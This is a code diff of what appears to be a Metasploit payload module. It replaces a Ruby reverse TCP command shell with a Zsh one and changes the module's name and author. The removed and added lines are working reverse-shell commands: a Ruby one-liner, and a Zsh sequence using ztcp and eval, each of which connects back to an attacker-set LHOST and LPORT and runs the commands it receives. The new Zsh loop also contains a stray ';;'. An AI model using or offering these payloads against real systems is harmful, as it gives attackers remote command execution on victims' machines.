@@ -17,9 +17,9 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'        => 'Unix Command Shell, Reverse TCP (via Ruby)',
-			'Description' => 'Connect back and create a command shell via Ruby',
-			'Author'      => 'kris katterjohn',
+			'Name'        => 'Unix Command Shell, Reverse TCP (via Zsh)',
+			'Description' => 'Connect back and create a command shell via Zsh',
+			'Author'      => 'Doug Prostko <dougtko[at]gmail.com>',
 			'License'     => MSF_LICENSE,
 			'Platform'    => 'unix',
 			'Arch'        => ARCH_CMD,
@@ -36,8 +36,9 @@ module Metasploit3
 	end
 
 	def command_string
-		lhost = datastore['LHOST']
-		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+		cmd = "zmodload zsh/net/tcp;"
+		cmd << "ztcp #{datastore['LHOST']} #{datastore['LPORT']};"
+		cmd << "fd=$REPLY;"
+		cmd << "while [ $REPLY ];do read -r cmd <&$REPLY;eval ${cmd} >&$REPLY;;done"
 	end
 end
